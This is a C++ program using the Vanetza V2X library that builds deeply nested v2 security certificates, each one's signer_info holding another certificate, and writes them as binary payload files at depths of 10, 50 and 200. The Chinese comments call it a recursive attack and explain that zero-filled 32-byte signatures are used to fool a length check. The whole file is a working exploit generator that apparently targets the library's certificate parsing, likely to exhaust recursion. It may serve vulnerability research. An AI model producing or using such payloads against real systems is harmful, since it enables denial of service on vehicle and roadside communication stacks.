#include <vanetza/common/byte_buffer.hpp>
#include <vanetza/common/archives.hpp>
#include <vanetza/common/serialization.hpp>
#include <vanetza/security/v2/certificate.hpp>
#include <fstream>
#include <iostream>
#include <sstream>

using namespace vanetza;

void generate_v2_payload(int depth, const std::string& filename) {
    // 1. 建立最底層的 Root 憑證
    security::v2::Certificate root_cert;
    root_cert.signer_info = std::array<uint8_t, 8>{}; 
    
    // 塞入 32 bytes 的空資料，騙過序列化時的 signature.s 長度檢查
    root_cert.signature.s.assign(32, 0x00); 

    security::v2::Certificate current_cert = root_cert;

    // 2. 建構遞迴攻擊
    for (int i = 0; i < depth; ++i) {
        security::v2::Certificate next_cert;
        next_cert.signer_info = current_cert;
        
        // 每一層遞迴的憑證也必須有正確長度的假簽章
        next_cert.signature.s.assign(32, 0x00);
        
        current_cert = next_cert;
    }

    std::ostringstream oss(std::ios::binary);
    OutputArchive archive(oss); 
    
    // 序列化
    serialize(archive, current_cert);

    // 寫入檔案
    std::string output = oss.str();
    std::ofstream out(filename, std::ios::binary);
    out.write(output.data(), output.size());
    std::cout << "v2 Certificate Payload: " << filename << " (" << output.size() << " bytes, depth: " << depth << ")\n";
}

int main() {
    generate_v2_payload(10, "qos_depth_10.bin");
    generate_v2_payload(50, "qos_depth_50.bin");
    generate_v2_payload(200, "qos_depth_200.bin");
    return 0;
}